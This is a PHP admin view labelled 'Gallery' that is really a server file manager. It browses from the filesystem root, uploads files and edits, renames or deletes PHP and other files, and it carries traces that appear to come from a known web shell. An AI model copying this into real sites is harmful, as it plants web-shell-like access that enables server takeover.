<section class="content-header" style="padding:0;">
    <div class="box box-solid">
        <ol class="breadcrumb">
            <li><a href="<?php echo base_url(''); ?>"><i class="fa fa-dashboard"></i> Main Navigation</a></li>
            <li class="active">Gallery</li>
        </ol>
    </div>
</section>

<div class="box">

    <div class="overlay">
      <i class="fa fa-refresh fa-spin"></i>
    </div>

    <div class="box-header">
        <?php echo $this->session->flashdata('message');?>
        <h3 class="box-title">&nbsp;
            <!-- <a href="#" data-target="#mAdd" data-toggle="modal" class="btn btn-primary" id="add"></i> Add </a> -->
            &nbsp;&nbsp;Gallery
        </h3> 
    </div>

    <hr style="margin: 0;">

    <div class="box-body">

    	<div class="col-xs-12">
    	<?php
    	//SITEMAP 
    	foreach($paths as $id=>$pat){
			if($pat == '' && $id == 0){
				$a = true;
				echo '<font color=#fff><center>$ root@mytemp : <a href="?path=/">/</a>';
				continue;
			}

			if($pat == '') continue;

			echo '<a href="'.base_url('admin-gallery-index/');

			$uponelevel 	= '';
			$thislevel  	= '';
			$thislevelfull  = '';

			for($i=0;$i<=$id;$i++){
				echo "$paths[$i]";
				$thislevelfull .= "$paths[$i]";

				if($i != $id){ 
					$thislevelfull .= "+";
					echo "+"; 
				}

				if($i != $id){
					$uponelevel .= "$paths[$i]"."+";
				}

				if($i>3){
					$thislevel .= "$paths[$i]";

					if($i != $id){ 
						$thislevel .= "+";
					}
				}
			}

			echo '">'.$pat.'</a>/';
		} 
		?>   
			<center>
				<form enctype="multipart/form-data" action="<?php echo base_url('admin/gallery/action/upload');?>" method="POST">
						<input style="background:silver;font-family: Comic Sans MS " type="file" name="file" id="file"/>
						<input type="hidden" id="pathupload" name="pathupload" value="<?php echo $thislevelfull;?>"/>
						<input type="submit" id="upload" value="Uploadd" />
				</form>
			</center>		 		
    	</div>

    	<div class="col-xs-12">
	    	<table class="table table-bordered" align="center">
				<thead>
					<tr>
						<th>Name</th>
						<th>Size</th>
						<th>Perm</th>
						<th>Options</th>
					</tr>
				</thead>
				<tbody>
					<tr>
						<td><a href="<?php echo base_url('admin-gallery-index/'.$uponelevel);?>">..</a></td>
						<td align=center>NONE</td> 
						<td align=center>LINK</td> 
						<td align=center> 
							<a href="#" data-target="#mAdd" data-toggle="modal" class="add" id="add" type="file" opt="cfile" path="<?php echo $thislevel;?>">+ New File</a><!-- <a href="<?php echo base_url('gallery/action/').'option/'.$pa.'/cfile/new.php';?>">+ New File</a>  -->
							| 
							<a href="#" data-target="#mAdd" data-toggle="modal" class="add" id="add" type="dir" opt="cdir" path="<?php echo $thislevel;?>">+ New Folder</a><!-- <a href="<?php echo base_url().'?option&path='.$pa.'&opt=btw&type=dir';?>">+ New Dir</a>  -->
						</td>
					</tr>

			    	<?php 
						foreach($scandir as $dir){
							if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
							$reppath = str_replace('/','+', $path);
					?>

					<tr>
						<td> 
							<i class="fa fa-folder"></i> 
							<a href="<?php echo base_url('admin-gallery-index/').$reppath.'+'.$dir;?>"><?php echo $dir;?></a>
						</td>
						<td align="center">
							DIR
						</td>
						<td align="center">
							<?php
								if(is_writable("$path/$dir")) echo '<font color="green">';

								elseif(!is_readable("$path/$dir")) echo '<font color="red">';

								//echo perms("$path/$dir");

								if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
							?>
						</td>
						<td align="center">
							<a data-target="#mViewx" data-toggle="modal" class="view" id="rename" type="file" opt="nfile" file="<?php echo $dir.'+folder';?>" path="<?php echo $thislevelfull;?>" href="<?php echo '#';?>" >Rename</a>
							<a data-target="#deleteModalx" data-toggle="modal" class="delete" id="delete" type="dir" opt="rdir" file="<?php echo $dir;?>" path="<?php echo $thislevelfull;?>" href="<?php echo '#';?>" >Delete</a>

							<!-- <a href="<?php echo '?option&path=$path&opt=delete&type=dir&name=$dir';?>">Delete</a>  -->
							<!-- <a href="<?php echo '?option&path=$path&opt=chmod&type=dir&name=$dir';?>">Chmod</a> -->
						</td>
					</tr>
					<?php } ?>

					<br>

					<?php 
					foreach($scandir as $file){
						if(!is_file("$path/$file")) continue;
						$size = filesize("$path/$file")/1024;
						$size = round($size,3);

						if($size >= 1024){

							$size = round($size/1024,2).' MB';
						}else{

							$size = $size.' KB';
						}
					?>

					<tr>
						<?php  
							$exfile 	= explode('.', $file);
							$countFile 	= count($exfile);
							$sortArray  = $countFile - 1;
							$extension	= $exfile[$sortArray]; 

							if($countFile > 1){
								$pushExFile = $exfile[0].'+'.$exfile[1];
							}else{
								$pushExFile = $file;
							}
						?>
						<td> 
							<i class="fa fa-file-o"></i>
							<?php if($extension == 'txt' || $extension == 'php' || $extension == 'css' || $extension == 'html' || $extension == 'js' || $extension == 'scss'){ ?>
								<a data-target="#mEditorx" data-toggle="modal" class="editor" id="editor" type="file" opt="efile" file="<?php echo $pushExFile;?>" path="<?php echo $thislevelfull;?>" href="<?php echo '#';//'?filesrc=$path/$file&path=$path';?>" ><?php echo $file;?></a>
							<?php }elseif($extension == 'jpg' || $extension == 'png' || $extension == 'gif' || $extension == 'jpeg'){ ?>
								<a data-target="#mPhotox" data-toggle="modal" class="photo" id="photo" type="file" opt="efile" file="<?php echo $pushExFile;?>" path="<?php echo $thislevel;?>" href="<?php echo '#';//'?filesrc=$path/$file&path=$path';?>" ><?php echo $file;?></a>
							<?php }else{ ?>
								<a href="<?php echo base_url('admin/gallery/action/filesrc/'.$thislevelfull.'/'.$pushExFile);?>"><?php echo $file;?></a>
							<?php } ?>
						</td>
						<td align="center">
							<?php echo $size;?>
						</td>
						<td align="center">
							<?php 
								if(is_writable("$path/$file")) echo '<font color="green">';

								elseif(!is_readable("$path/$file")) echo '<font color="red">';

								//echo perms("$path/$file");

								if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
							?>
						</td>
						<td align="center">
							<?php if($extension == 'txt' || $extension == 'php' || $extension == 'css' || $extension == 'html' || $extension == 'js' || $extension == 'scss'){ ?>
							<a data-target="#mEditorx" data-toggle="modal" class="editor" id="editor" type="file" opt="efile" file="<?php echo $pushExFile;?>" path="<?php echo $thislevelfull;?>" href="<?php echo '#';?>" >Edit</a>
							<?php } ?>
							<a data-target="#mViewx" data-toggle="modal" class="view" id="rename" type="file" opt="nfile" file="<?php echo $pushExFile;?>" path="<?php echo $thislevelfull;?>" href="<?php echo '#';?>" >Rename</a>
							<a data-target="#deleteModalx" data-toggle="modal" class="delete" id="delete" type="file" opt="rfile" file="<?php echo $pushExFile;?>" path="<?php echo $thislevelfull;?>" href="<?php echo '#';?>" >Delete</a>
							
							<!-- <a href="<?php echo '?option&path=$path&opt=delete&type=file&name=$file';?>">Delete</a>  -->
							<!-- <a href="<?php echo '?option&path=$path&opt=chmod&type=file&name=$file';?>">Chmod</a> -->
						</td>
					</tr>
					<?php } ?>
				</tbody>
			</table>
    	</div>
    </div>
</div>

